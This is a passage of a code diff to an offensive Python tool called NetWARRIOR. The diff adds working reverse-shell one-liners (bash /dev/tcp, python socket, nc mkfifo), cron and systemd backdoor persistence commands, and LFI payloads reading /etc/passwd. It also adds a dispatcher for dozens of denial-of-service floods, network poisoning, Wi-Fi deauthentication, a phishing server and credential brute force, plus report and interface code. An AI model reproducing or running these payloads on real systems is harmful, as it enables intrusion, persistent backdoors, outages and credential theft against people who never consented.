     async def web_lfi_scan(self, url, params, payloads=None):
         if payloads is None:
-            payloads = ["../../etc/passwd", "../../../boot.ini"]
+            payloads = ["../../../../etc/passwd", "../../../../windows/win.ini",
+                        "....//....//....//etc/passwd"]
         found = []
-        async with aiohttp.ClientSession() as session:
-            for payload in payloads:
-                for param in params:
-                    data = {param: payload}
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            for param in params:
+                for payload in payloads:
                     try:
-                        async with session.get(url, params=data, timeout=5) as resp:
+                        async with session.get(url, params={param: payload}) as resp:
                             text = await resp.text()
-                            if "root:" in text or "[boot loader]" in text:
-                                found.append({"param": param, "payload": payload})
+                        if "root:x:0:0:" in text or "[extensions]" in text.lower():
+                            found.append({"param": param, "payload": payload, "signal": "file contents returned"})
                     except Exception:
                         pass
         return found
@@ -1756,39 +2089,112 @@ class Pentest:
 # POST-EXPLOIT
 # ──────────────────────────────────────────────────────────────────────────────
 class PostExploit:
+    SHELLS = ("bash", "python", "nc", "sh")
+
     @staticmethod
     def reverse_shell_payload(host, port, shell="bash"):
+        shell = (shell or "bash").lower()
         if shell == "bash":
             return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
-        elif shell == "python":
-            return f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
-        elif shell == "nc":
-            return f"nc {host} {port} -e /bin/sh"
+        if shell == "sh":
+            return f"sh -i >& /dev/tcp/{host}/{port} 0>&1"
+        if shell == "python":
+            return (
+                "python3 -c 'import socket,subprocess,os;"
+                "s=socket.socket();"
+                f's.connect(("{host}",{port}));'
+                "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
+                "subprocess.call([\"/bin/sh\",\"-i\"])'"
+            )
+        if shell == "nc":
+            return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
         return ""
+
     @staticmethod
-    def persistence_payload(method="cron", command="/bin/bash -i > /dev/tcp/...", interval="* * * * *"):
+    def persistence_payload(method="cron", command="", interval="* * * * *"):
+        method = (method or "cron").lower()
+        command = command or "/bin/sh -i"
         if method == "cron":
-            return f"echo '{interval} {command}' >> /etc/crontab"
-        elif method == "systemd":
-            return f"echo -e '[Service]\nExecStart={command}\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service && systemctl enable backdoor"
+            return f"( crontab -l 2>/dev/null; echo '{interval} {command}' ) | crontab -"
+        if method == "systemd":
+            return (
+                "cat > /etc/systemd/system/nw-backdoor.service <<'EOF'\n"
+                "[Service]\n"
+                f"ExecStart={command}\n"
+                "Restart=always\n"
+                "[Install]\n"
+                "WantedBy=multi-user.target\n"
+                "EOF\n"
+                "systemctl enable --now nw-backdoor"
+            )
         return ""
+
 
 # ──────────────────────────────────────────────────────────────────────────────
 # REPORT
 # ──────────────────────────────────────────────────────────────────────────────
 class Report:
     @staticmethod
-    def generate_html(registry: AttackRegistry, log_bus: LogBus):
-        html = "<html><head><title>NetWARRIOR Report</title></head><body><h1>Attack Report</h1>"
-        html += f"<p>Total packets: {registry.total_packets()}</p>"
-        html += "<ul>"
-        for name, att in registry._attacks.items():
-            html += f"<li>{name}: {att.packets_sent} packets, {att.errors} errors</li>"
-        html += "</ul><h2>Logs</h2><pre>"
-        for entry in log_bus.get(100):
-            html += f"{entry['time']} [{entry['level']}] {entry['msg']}\n"
-        html += "</pre></body></html>"
-        return html
+    def generate_html(registry: "AttackRegistry", log_bus: "LogBus", net=None) -> str:
+        e = html.escape
+        rows = []
+        for att in registry.snapshot():
+            rows.append(
+                "<tr><td>{}</td><td class=n>{:,}</td><td class=n>{:,}</td>"
+                "<td class=n>{}</td><td class=n>{:.1f}s</td><td>{}</td></tr>".format(
+                    e(att.name), att.packets_sent, att.bytes_sent, att.errors,
+                    att.duration, "running" if att.running else "done",
+                )
+            )
+        findings = []
+        for att in registry.snapshot():
+            for f in att.findings:
+                findings.append(f"<li><b>{e(att.name)}</b>: {e(str(f))}</li>")
+        logs = "\n".join(
+            f"{e(x['time'])} [{e(x['level'])}] {e(x.get('tag',''))} {e(x['msg'])}"
+            for x in log_bus.get(200)
+        )
+        meta = ""
+        if net is not None:
+            meta = f"<p>Source: {e(net.ip)} ({e(net.interface)})  Gateway: {e(net.gateway)}</p>"
+        generated = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        return f"""<!doctype html>
+<html><head><meta charset="utf-8"><title>NetWARRIOR Report</title>
+<style>
+ body{{font:14px/1.5 system-ui,sans-serif;margin:2rem;color:#111}}
+ h1{{margin-bottom:0}} .sub{{color:#666}}
+ table{{border-collapse:collapse;margin:1rem 0;width:100%}}
+ th,td{{border:1px solid #ccc;padding:4px 8px;text-align:left}}
+ td.n{{text-align:right;font-variant-numeric:tabular-nums}}
+ pre{{background:#f5f5f5;padding:1rem;overflow:auto;max-height:24rem}}
+</style></head><body>
+<h1>NetWARRIOR Session Report</h1>
+<p class="sub">Generated {generated}</p>
+{meta}
+<p>Total packets sent: <b>{registry.total_packets():,}</b> &nbsp;
+   Total traffic: <b>{Utils.human_size(registry.total_bytes())}</b></p>
+<h2>Attacks</h2>
+<table><tr><th>Attack</th><th>Packets</th><th>Bytes</th><th>Errors</th><th>Duration</th><th>Status</th></tr>
+{''.join(rows) or '<tr><td colspan=6>No attacks recorded</td></tr>'}
+</table>
+<h2>Findings</h2>
+<ul>{''.join(findings) or '<li>None</li>'}</ul>
+<h2>Log</h2>
+<pre>{logs}</pre>
+</body></html>"""
+
+    @staticmethod
+    def save(config: "Config", registry: "AttackRegistry", log_bus: "LogBus", net=None) -> Optional[str]:
+        try:
+            out = config.output_dir
+            out.mkdir(parents=True, exist_ok=True)
+            path = out / f"netwarrior_{datetime.datetime.now():%Y%m%d_%H%M%S}.html"
+            path.write_text(Report.generate_html(registry, log_bus, net), encoding="utf-8")
+            log_bus.add(f"Report saved to {path}", tag="REPORT")
+            return str(path)
+        except Exception as e:
+            log_bus.add(f"Report save failed: {e}", level="error", tag="REPORT")
+            return None
 
 # ──────────────────────────────────────────────────────────────────────────────
 # UI – FULL INTERACTIVE WITH WORKING COMMAND MODE AND OUTPUT PANEL
@@ -1907,11 +2313,34 @@ class UI:
         self.running        = True
         self.mode           = "menu"
         self.cmd_output     = ""
-        self._command_queue = asyncio.Queue()
-        self._stdin_reader  = None
+        self._stdin_q       = queue.Queue()
+        self._stdin_thread  = None
+        self._attack_tasks  = set()
+        self._cmd_tasks     = set()
 
         # Dedicated console so we never fight with the global one inside Live
         self._con = Console(force_terminal=True, highlight=False)
+
+    # ── Task tracking ─────────────────────────────────────────────────────────
+    def _spawn_attack(self, coro):
+        """Run an attack coroutine in the background so the UI stays interactive."""
+        task = asyncio.create_task(coro)
+        self._attack_tasks.add(task)
+        task.add_done_callback(self._attack_tasks.discard)
+        return task
+
+    def _spawn_command(self, cmd: str):
+        """Process a command off the render loop so long scans never freeze the UI."""
+        self.cmd_output = f"> {cmd}"
+        task = asyncio.create_task(self._process_command(cmd))
+        self._cmd_tasks.add(task)
+        task.add_done_callback(self._cmd_tasks.discard)
+
+    def _stop_attacks(self):
+        """Cooperatively stop all running attacks, then cancel any stragglers."""
+        self.registry.stop_all()
+        for task in list(self._attack_tasks):
+            task.cancel()
 
     # ── Box style selection ───────────────────────────────────────────────────
     @staticmethod
@@ -1944,38 +2373,55 @@ class UI:
 
     # ── Async run loop ────────────────────────────────────────────────────────
     async def run(self):
-        self._stdin_reader = asyncio.create_task(self._stdin_reader_thread())
-        pb = self._panel_box()
-        with Live(
-            self._render(),
-            refresh_per_second=4,
-            screen=True,
-            console=self._con,
-        ) as live:
-            while self.running:
-                live.update(self._render())
-                while not self._command_queue.empty():
-                    cmd = await self._command_queue.get()
-                    await self._process_command(cmd)
-                await asyncio.sleep(0.1)
-        if self._stdin_reader:
-            self._stdin_reader.cancel()
-        self.engine.stop()
+        self._stdin_thread = threading.Thread(
+            target=self._stdin_reader, name="stdin-reader", daemon=True
+        )
+        self._stdin_thread.start()
+        try:
+            with Live(
+                self._render(),
+                refresh_per_second=4,
+                screen=True,
+                console=self._con,
+            ) as live:
+                while self.running:
+                    live.update(self._render())
+                    while True:
+                        try:
+                            cmd = self._stdin_q.get_nowait()
+                        except queue.Empty:
+                            break
+                        if cmd is None:          # stdin closed (EOF / Ctrl-D)
+                            self.running = False
+                            break
+                        self._spawn_command(cmd)
+                    await asyncio.sleep(0.1)
+        finally:
+            await self._shutdown()
 
-    async def _stdin_reader_thread(self):
-        loop = asyncio.get_running_loop()
+    async def _shutdown(self):
+        self.running = False
+        self._stop_attacks()
+        for task in list(self._cmd_tasks):
+            task.cancel()
+        self.engine.stop()
+        pending = list(self._attack_tasks) + list(self._cmd_tasks)
+        if pending:
+            await asyncio.gather(*pending, return_exceptions=True)
+
+    def _stdin_reader(self):
+        """Blocking stdin read on a daemon thread. Dies with the process."""
         while self.running:
             try:
-                line = await loop.run_in_executor(None, sys.stdin.readline)
-                if not line:
-                    await asyncio.sleep(0.1)
-                    continue
-                line = line.strip()
-                if line:
-                    await self._command_queue.put(line)
-            except Exception as e:
-                self.log.add(f"Stdin error: {e}", level="error")
-                await asyncio.sleep(0.1)
+                line = sys.stdin.readline()
+            except Exception:
+                break
+            if not line:            # EOF (piped input exhausted / Ctrl-D)
+                break
+            line = line.strip()
+            if line:
+                self._stdin_q.put(line)
+        self._stdin_q.put(None)     # tell the render loop to shut down
 
     # ── Master render ─────────────────────────────────────────────────────────
     def _render(self) -> Layout:
@@ -2067,12 +2513,6 @@ class UI:
             nav.append(f" {label}", style=label_style)
 
         return Panel(
-            Text.from_markup(f"[grey35]{'─' * 10}[/]"),  # invisible line for padding
-            renderable=None,
-            border_style=self._c("border_dim"),
-            box=pb,
-            padding=(0, 0),
-        ) if False else Panel(  # always use second branch
             nav,
             border_style=self._c("border_dim"),
             box=pb,
@@ -2349,22 +2789,28 @@ class UI:
         t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
         t.add_column("ATTACK",  style=self._c("key"),   ratio=3)
         t.add_column("PACKETS", style=self._c("desc"),  justify="right", width=12)
+        t.add_column("TRAFFIC", style=self._c("desc"),  justify="right", width=12)
         t.add_column("ERRORS",  style="bright_yellow",  justify="right", width=8)
         t.add_column("STATUS",  style=self._c("desc"),  width=10)
 
-        for name, att in self.registry._attacks.items():
+        snapshot = self.registry.snapshot()
+        for att in snapshot:
             status = (
                 Text("RUNNING", style=f"bold {self._c('active_dot')}")
                 if att.running
                 else Text("DONE", style=self._c("dim"))
             )
-            t.add_row(name, f"{att.packets_sent:,}", str(att.errors), status)
+            t.add_row(att.name, f"{att.packets_sent:,}",
+                      Utils.human_size(att.bytes_sent), str(att.errors), status)
 
-        if not self.registry._attacks:
-            t.add_row("[dim]No attacks recorded yet[/]", "", "", "")
+        if not snapshot:
+            t.add_row("[dim]No attacks recorded yet[/]", "", "", "", "")
 
         summary = Text(
-            f"\n  Total packets: {pkts:,}   Active attacks: {len(active)}\n",
+            f"\n  Total packets: {pkts:,}   "
+            f"Traffic: {Utils.human_size(self.registry.total_bytes())}   "
+            f"Active attacks: {len(active)}   "
+            f"(type 'report save' to export HTML)\n",
             style=self._c("dim"),
         )
         return Panel(
@@ -2391,16 +2837,18 @@ class UI:
             ("scan <subnet>",                      "Network discovery (CIDR notation)"),
             ("fingerprint <ip>",                   "OS detection and service banners"),
             ("map <subnet>",                       "ARP + ICMP topology map"),
-            ("dns <domain>",                       "DNS lookup"),
-            ("dnsrev <ip>",                        "Reverse DNS lookup"),
+            ("dns <domain> / dnsrev <ip>",         "Forward / reverse DNS lookup"),
+            ("zone <domain> <server>",             "DNS zone transfer attempt"),
             ("vuln <ip>",                          "Vulnerability check against banners"),
             ("sshbrute / ftpbrute / httpbasic",    "Credential brute force attacks"),
             ("sql / xss / lfi / ssrf / cmdinj",    "Web application vulnerability probes"),
-            ("attack <type> <target> [args]",      "Launch an attack (see ATTACK menu for types)"),
-            ("list",                               "List all active attacks by name"),
-            ("stop  /  s",                         "Stop all running attacks"),
-            ("status",                             "Print packet count and active attack count"),
-            ("report",                             "Switch to report view"),
+            ("attack <type> <target> [port] [dur] [pps]", "Launch an attack (see ATTACK menu)"),
+            ("list",                               "List active attacks"),
+            ("stop  /  s",                         "Stop all running attacks (engine keeps running)"),
+            ("status",                             "Packet count, traffic and active attack count"),
+            ("report  /  report save",             "Report view  /  export an HTML report"),
+            ("payload revshell <host> <port>",     "Generate a reverse-shell one-liner"),
+            ("payload persist <cron|systemd> <cmd>","Generate a persistence one-liner"),
             ("conns",                              "Show live connection table"),
             ("q  /  quit",                         "Exit NetWARRIOR cleanly"),
         ]
@@ -2430,8 +2878,9 @@ class UI:
             "info":  ("INFO", self._c("log_info")),
         }
 
+        entries = self.log.get(12)
         lines = Text()
-        for entry in self.log.get(12):
+        for entry in entries:
             level  = entry.get("level", "info")
             label, lstyle = level_map.get(level, ("INFO", self._c("log_info")))
             tag    = entry.get("tag", "")
@@ -2451,7 +2900,7 @@ class UI:
                 lines.append("  ")
             lines.append(msg + "\n", style=self._c("log_msg"))
 
-        if not lines._spans:
+        if not entries:
             lines.append("  No log entries yet.", style=self._c("dim"))
 
         return Panel(
@@ -2486,7 +2935,7 @@ class UI:
             padding=(0, 1),
         )
 
-    # ── Command processor (unchanged from final version) ──────────────────────
+    # ── Command processor ─────────────────────────────────────────────────────
     async def _process_command(self, cmd):
         parts = cmd.strip().split()
         if not parts:
@@ -2496,7 +2945,6 @@ class UI:
 
         if command in ("q", "quit"):
             self.running = False
-            self.engine.stop()
             return
         elif command == "1":
             self.mode = "attack"
@@ -2519,8 +2967,9 @@ class UI:
             self.cmd_output = "Command mode active. Type commands directly."
             return
         elif command in ("s", "stop"):
-            self.engine.stop()
-            self.cmd_output = "All attacks stopped."
+            n = len(self.registry.active())
+            self._stop_attacks()
+            self.cmd_output = f"Stopped {n} running attack(s)." if n else "No attacks running."
             return
 
         def table_to_str(table):
@@ -2679,181 +3128,184 @@ class UI:
                         else "[green]No command injection found[/]"
                     )
             elif command == "attack":
-                if len(args) < 2:
+                if len(args) < 1:
                     output = "[red]Usage: attack <type> <target> [port] [duration] [pps][/]"
                 else:
-                    atype    = args[0]
-                    target   = args[1]
-                    port     = int(args[2]) if len(args) > 2 else 80
-                    duration = int(args[3]) if len(args) > 3 else 30
-                    pps      = int(args[4]) if len(args) > 4 else 1000
-                    method_map = {
-                        "syn":        self.attacks.syn_flood,
-                        "udp":        self.attacks.udp_flood,
-                        "icmp":       self.attacks.icmp_flood,
-                        "ack":        self.attacks.tcp_ack_flood,
-                        "rst":        self.attacks.tcp_rst_flood,
-                        "xmas":       self.attacks.tcp_xmas_flood,
-                        "null":       self.attacks.tcp_null_flood,
-                        "fin":        self.attacks.tcp_fin_flood,
-                        "zero":       self.attacks.tcp_zero_window,
-                        "mac":        self.attacks.mac_flood,
-                        "smurf":      self.attacks.smurf,
-                        "land":       self.attacks.land,
-                        "sctp":       self.attacks.sctp_init_flood,
-                        "teardrop":   self.attacks.teardrop,
-                        "pod":        self.attacks.ping_of_death,
-                        "dnsamp":     self.attacks.dns_amp,
-                        "ntpamp":     self.attacks.ntp_amp,
-                        "snmpamp":    self.attacks.snmp_amp,
-                        "memcached":  self.attacks.memcached_amp,
-                        "ssdpamp":    self.attacks.ssdp_amp,
-                        "chargen":    self.attacks.chargen_amp,
-                        "slowloris":  self.attacks.slowloris,
-                        "http":       self.attacks.http_flood,
-                        "rudy":       self.attacks.rudy_attack,
-                        "slowread":   self.attacks.slow_read,
-                        "http2reset": self.attacks.http2_rapid_reset,
-                        "ws":         self.attacks.websocket_flood,
-                        "arp":        self.attacks.arp_poison,
-                        "vlan":       self.attacks.vlan_double_tag,
-                        "gre":        self.attacks.gre_ip_spoof,
-                        "pcap":       self.attacks.replay_pcap,
-                        "deauth":     self.attacks.deauth,
-                        "beacon":     self.attacks.beacon_flood,
-                        "ipv6ra":     self.attacks.ipv6_ra_flood,
-                        "ipv6na":     self.attacks.ipv6_na_flood,
-                        "ipv6ns":     self.attacks.ipv6_ns_flood,
-                        "l2cdp":      self.attacks.l2_protocol_flood,
-                        "l2lldp":     self.attacks.l2_protocol_flood,
-                        "l2stp":      self.attacks.l2_protocol_flood,
-                        "llmnr":      self.attacks.llmnr_poison,
-                        "nbns":       self.attacks.nbns_poison,
-                        "mdns":       self.attacks.mdns_poison,
-                        "dhcp":       self.attacks.dhcp_starvation,
-                        "phish":      self.attacks.start_phishing_server,
-                        "cloud":      self.attacks.cloud_recon,
-                        "sshtun":     self.attacks.ssh_tunnel,
-                        "passive":    self.attacks.passive_capture,
-                        "perf":       self.attacks.network_perf,
-                        "ssdpdiscovery": self.attacks.ssdp_discovery,
-                        "radiuspod":  self.attacks.radius_pod,
-                        "nmap":       self.attacks.nmap_wrapper,
-                        "sqlmap":     self.attacks.sqlmap_wrapper,
-                        "ftpbrute":   self.attacks.ftp_brute,
-                        "httpbasic":  self.attacks.http_basic_brute,
-                        "ssrf":       self.attacks.ssrf_scan,
-                        "cmdinj":     self.attacks.cmd_injection_scan,
-                        "exploitssh": self.attacks.exploit_ssh,
-                        "wirehand":   self.attacks.wireless_handshake_capture,
-                        "autoesc":    self.attacks.auto_escalate,
-                        "traffic":    self.attacks.traffic_monitor,
-                        "bandwidth":  self.attacks.bandwidth_meter,
-                        "conns":      self.attacks.connection_table,
-                        "chaos":      self.attacks.chaos_mode,
-                    }
-                    if atype not in method_map:
-                        output = f"[red]Unknown attack type: {atype}[/]"
-                    else:
-                        method = method_map[atype]
+                    def _int(v, d):
                         try:
-                            no_port_types = {
-                                "icmp", "teardrop", "pod",
-                                "dnsamp", "ntpamp", "snmpamp", "memcached", "ssdpamp", "chargen",
-                                "ssdpdiscovery", "radiuspod", "pcap", "deauth", "beacon",
-                                "ipv6ra", "ipv6na", "ipv6ns",
-                                "l2cdp", "l2lldp", "l2stp",
-                                "gre", "llmnr", "nbns", "mdns", "dhcp",
-                                "cloud", "passive", "perf",
-                                "nmap", "sqlmap", "ftpbrute", "httpbasic",
-                                "ssrf", "cmdinj", "exploitssh", "wirehand",
-                                "autoesc", "traffic", "bandwidth", "conns", "chaos",
-                            }
-                            if atype in ("l2cdp", "l2lldp", "l2stp"):
-                                await method(proto_type=atype[2:], duration=duration, pps=pps)
-                            elif atype == "pcap":
-                                await method(target, duration=duration, pps=pps)
-                            elif atype == "deauth":
-                                await method(target, duration=duration)
-                            elif atype == "beacon":
-                                await method(duration=duration)
-                            elif atype in ("llmnr", "nbns", "mdns"):
-                                await method(target, duration=duration)
-                            elif atype == "dhcp":
-                                await method(target, duration=duration)
-                            elif atype == "cloud":
-                                await method(target_ips=[target], duration=duration)
-                            elif atype == "passive":
-                                await method(duration=duration)
-                            elif atype == "perf":
-                                await method(target, duration=duration)
-                            elif atype in ("ssdpdiscovery", "radiuspod"):
-                                await method(duration=duration)
-                            elif atype == "nmap":
-                                await method(target, duration=duration)
-                            elif atype == "sqlmap":
-                                await method(target, duration=duration)
-                            elif atype == "ftpbrute":
-                                await method(target, "anonymous", "/usr/share/wordlists/rockyou.txt")
-                            elif atype == "httpbasic":
-                                await method(target, "/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt")
-                            elif atype == "ssrf":
-                                await method(target, ["url"])
-                            elif atype == "cmdinj":
-                                await method(target, ["cmd"])
-                            elif atype == "exploitssh":
-                                await method(target, username="root")
-                            elif atype == "wirehand":
-                                await method(duration=duration)
-                            elif atype in ("autoesc", "traffic", "bandwidth", "conns", "chaos"):
-                                await method(target, duration=duration) if atype != "conns" else await method()
-                            elif atype in ("arp", "smurf", "mac"):
-                                await method(target, duration=duration, pps=pps)
-                            elif atype == "vlan":
-                                await method(target, duration=duration, pps=pps)
-                            elif atype in ("slowloris", "http", "rudy", "slowread", "http2reset", "ws"):
-                                await method(target, port=port, duration=duration)
-                            elif atype == "phish":
-                                await method(port=port, duration=duration)
-                            elif atype == "sshtun":
-                                await method(target, username="root", password="", duration=duration)
-                            elif atype in no_port_types:
-                                await method(target, duration=duration, pps=pps)
-                            else:
-                                await method(target, port, duration, pps)
-                            output = f"[green]Attack '{atype}' launched on {target}[/]"
-                        except Exception as e:
-                            output = f"[red]Attack failed: {e}[/]"
+                            return int(v)
+                        except (TypeError, ValueError):
+                            return d
+                    atype    = args[0].lower()
+                    target   = args[1] if len(args) > 1 else ""
+                    port     = _int(args[2], 80)   if len(args) > 2 else 80
+                    duration = _int(args[3], 30)   if len(args) > 3 else 30
+                    pps      = self.config.clamp_pps(_int(args[4], 1000) if len(args) > 4 else 1000)
+                    try:
+                        coro, needs_target = self._build_attack(atype, target, port, duration, pps)
+                    except ValueError as e:
+                        output = f"[red]{e}[/]"
+                    except KeyError:
+                        output = f"[red]Unknown attack type: {atype}  —  see the ATTACK menu[/]"
+                    else:
+                        reason = self.config.check_target(target) if needs_target else None
+                        if needs_target and not target:
+                            coro.close()
+                            output = f"[red]Attack '{atype}' requires a target[/]"
+                        elif reason:
+                            coro.close()
+                            output = f"[red]{reason}[/]"
+                        else:
+                            self._spawn_attack(coro)
+                            tgt = f" on {target}" if target else ""
+                            output = (f"[green]Attack '{atype}' launched{tgt} "
+                                      f"(duration {duration}s, {pps} pps). Type 'stop' to end it.[/]")
             elif command == "list":
                 active = self.registry.active()
                 output = (
-                    f"[yellow]Active: {', '.join(active)}[/]"
+                    f"[yellow]Active ({len(active)}): {', '.join(active)}[/]"
                     if active
                     else "[dim]No active attacks[/]"
                 )
-            elif command == "stop":
-                self.engine.stop()
-                output = "[red]All attacks stopped[/]"
+            elif command in ("stop", "s"):
+                n = len(self.registry.active())
+                self._stop_attacks()
+                output = f"[red]Stopped {n} running attack(s)[/]" if n else "[dim]No attacks running[/]"
             elif command == "status":
                 pkts   = self.registry.total_packets()
                 active = self.registry.active()
                 output = (
                     f"Packets: {pkts:,}   "
+                    f"Traffic: {Utils.human_size(self.registry.total_bytes())}   "
                     f"Active: {len(active)}   "
                     f"IP: {self.net.ip or 'N/A'}"
                 )
-            elif command == "report":
-                self.mode = "report"
-                output = "Switched to Report view"
+            elif command in ("report", "savereport"):
+                if command == "savereport" or (args and args[0] == "save"):
+                    path = Report.save(self.config, self.registry, self.log, self.net)
+                    output = f"[green]Report written to {path}[/]" if path else "[red]Report failed[/]"
+                else:
+                    self.mode = "report"
+                    output = "Switched to Report view  (use 'report save' to write HTML)"
             elif command == "menu":
                 self.mode = "menu"
                 output = "Back to main menu"
+            elif command == "payload":
+                output = self._payload_command(args)
             else:
                 output = f"[red]Unknown command: {command}  —  type 'help' for reference[/]"
         except Exception as e:
             output = f"[red]Error: {e}[/]"
 
         self.cmd_output = output
+
+    # ── Attack coroutine builder ──────────────────────────────────────────────
+    def _build_attack(self, atype, target, port, duration, pps):
+        """
+        Return ``(coroutine, needs_target)`` for an ``attack`` command.
+
+        Raises ``KeyError`` for an unknown type and ``ValueError`` for a type
+        that has its own dedicated command instead.
+        """
+        redirect = {
+            "sshbrute":   "sshbrute <host> <user> <wordlist>",
+            "ftpbrute":   "ftpbrute <host> <user> <wordlist>",
+            "httpbasic":  "httpbasic <url> <userlist> <passlist>",
+            "ssrf":       "ssrf <url> <param>",
+            "cmdinj":     "cmdinj <url> <param>",
+            "sql":        "sql <url> <param>",
+            "xss":        "xss <url> <param>",
+            "lfi":        "lfi <url> <param>",
+        }
+        if atype in redirect:
+            raise ValueError(f"'{atype}' has its own command:  {redirect[atype]}")
+
+        a = self.attacks
+        iface = self.config.interface
+        DP = dict(duration=duration, pps=pps)
+        D  = dict(duration=duration)
+        specs = {
+            # target + port + duration + pps
+            "syn":  (lambda: a.syn_flood(target, port, duration, pps), True),
+            "udp":  (lambda: a.udp_flood(target, port, duration, pps), True),
+            "ack":  (lambda: a.tcp_ack_flood(target, port, duration, pps), True),
+            "rst":  (lambda: a.tcp_rst_flood(target, port, duration, pps), True),
+            "xmas": (lambda: a.tcp_xmas_flood(target, port, duration, pps), True),
+            "null": (lambda: a.tcp_null_flood(target, port, duration, pps), True),
+            "fin":  (lambda: a.tcp_fin_flood(target, port, duration, pps), True),
+            "zero": (lambda: a.tcp_zero_window(target, port, duration, pps), True),
+            "land": (lambda: a.land(target, port, duration, pps), True),
+            "sctp": (lambda: a.sctp_init_flood(target, port, duration, pps), True),
+            # target + duration (+ pps)
+            "icmp":      (lambda: a.icmp_flood(target, **DP), True),
+            "smurf":     (lambda: a.smurf(target, **DP), True),
+            "mac":       (lambda: a.mac_flood(target, **DP), True),
+            "teardrop":  (lambda: a.teardrop(target, **DP), True),
+            "pod":       (lambda: a.ping_of_death(target, **DP), True),
+            "gre":       (lambda: a.gre_ip_spoof(target, **DP), True),
+            "vlan":      (lambda: a.vlan_double_tag(target, **DP), True),
+            "arp":       (lambda: a.arp_poison(target, **D), True),
+            "dnsamp":    (lambda: a.dns_amp(target, **DP), True),
+            "ntpamp":    (lambda: a.ntp_amp(target, **DP), True),
+            "snmpamp":   (lambda: a.snmp_amp(target, **DP), True),
+            "memcached": (lambda: a.memcached_amp(target, **DP), True),
+            "ssdpamp":   (lambda: a.ssdp_amp(target, **DP), True),
+            "chargen":   (lambda: a.chargen_amp(target, **DP), True),
+            "ipv6ra":    (lambda: a.ipv6_ra_flood(target, **DP), True),
+            "ipv6na":    (lambda: a.ipv6_na_flood(target, **DP), True),
+            "ipv6ns":    (lambda: a.ipv6_ns_flood(target, **DP), True),
+            "llmnr":     (lambda: a.llmnr_poison(target, **D), True),
+            "nbns":      (lambda: a.nbns_poison(target, **D), True),
+            "mdns":      (lambda: a.mdns_poison(target, **D), True),
+            "dhcp":      (lambda: a.dhcp_starvation(**D), False),
+            "deauth":    (lambda: a.deauth(target, iface=(iface or "wlan0mon"), **D), True),
+            # app layer: target + port + duration
+            "slowloris":  (lambda: a.slowloris(target, port=port, duration=duration), True),
+            "http":       (lambda: a.http_flood(target, port=port, duration=duration), True),
+            "rudy":       (lambda: a.rudy_attack(target, port=port, duration=duration), True),
+            "slowread":   (lambda: a.slow_read(target, port=port, duration=duration), True),
+            "http2reset": (lambda: a.http2_rapid_reset(target, port=port, duration=duration), True),
+            "ws":         (lambda: a.websocket_flood(target, port=port, duration=duration), True),
+            "perf":       (lambda: a.network_perf(target, port=port, duration=duration), True),
+            "pcap":       (lambda: a.replay_pcap(target, duration=duration, pps=pps), True),
+            "nmap":       (lambda: a.nmap_wrapper(target, duration=max(duration, 60)), True),
+            "sqlmap":     (lambda: a.sqlmap_wrapper(target, duration=max(duration, 60)), True),
+            "autoesc":    (lambda: a.auto_escalate(target), True),
+            "chaos":      (lambda: a.chaos_mode(target, duration=duration), True),
+            # no target required
+            "beacon":        (lambda: a.beacon_flood(iface=(iface or "wlan0mon"), duration=duration), False),
+            "ssdpdiscovery": (lambda: a.ssdp_discovery(duration=duration), False),
+            "radiuspod":     (lambda: a.radius_pod(duration=duration), False),
+            "bandwidth":     (lambda: a.bandwidth_meter(duration=duration), False),
+            "conns":         (lambda: a.connection_table(), False),
+            "cloud":         (lambda: a.cloud_recon(target_ips=[target] if target else None, duration=duration), False),
+            "phish":         (lambda: a.start_phishing_server(port=port, duration=duration), False),
+            "l2cdp":         (lambda: a.l2_protocol_flood("cdp", **DP), False),
+            "l2lldp":        (lambda: a.l2_protocol_flood("lldp", **DP), False),
+            "l2stp":         (lambda: a.l2_protocol_flood("stp", **DP), False),
+            # interface-scoped (an optional interface name may be given as target)
+            "passive":  (lambda: a.passive_capture(interface=(target or iface), duration=duration), False),
+            "traffic":  (lambda: a.traffic_monitor(interface=(target or iface), duration=duration), False),
+            "wirehand": (lambda: a.wireless_handshake_capture(iface=(target or iface or "wlan0mon"), duration=duration), False),
+        }
+        maker, needs_target = specs[atype]        # KeyError -> unknown type
+        return maker(), needs_target
+
+    def _payload_command(self, args) -> str:
+        if not args:
+            return ("[red]Usage: payload revshell <host> <port> [bash|python|nc]  |  "
+                    "payload persist <cron|systemd> <command>[/]")
+        kind = args[0].lower()
+        if kind in ("revshell", "reverse", "rev"):
+            if len(args) < 3:
+                return "[red]Usage: payload revshell <host> <port> [bash|python|nc][/]"
+            shell = args[3] if len(args) > 3 else "bash"
+            return PostExploit.reverse_shell_payload(args[1], args[2], shell) or "[red]Unknown shell type[/]"
+        if kind in ("persist", "persistence"):
+            if len(args) < 3:
+                return "[red]Usage: payload persist <cron|systemd> <command...>[/]"
+            return PostExploit.persistence_payload(args[1], " ".join(args[2:])) or "[red]Unknown method[/]"
+        return f"[red]Unknown payload kind: {kind}[/]"
 # ──────────────────────────────────────────────────────────────────────────────
 # MAIN
 # ──────────────────────────────────────────────────────────────────────────────
@@ -2866,13 +3318,12 @@ async def main():
     ui = UI(config, net, registry, log, engine)
     try:
         await ui.run()
-    except KeyboardInterrupt:
+    except (KeyboardInterrupt, asyncio.CancelledError):
         console.print("\n[yellow]Interrupted[/]")
+        await ui._shutdown()
     finally:
-        engine.stop()
-        if ui._stdin_reader:
-            ui._stdin_reader.cancel()
         console.print("[green]Goodbye.[/]")
+
 
 if __name__ == "__main__":
     if _UVLOOP:
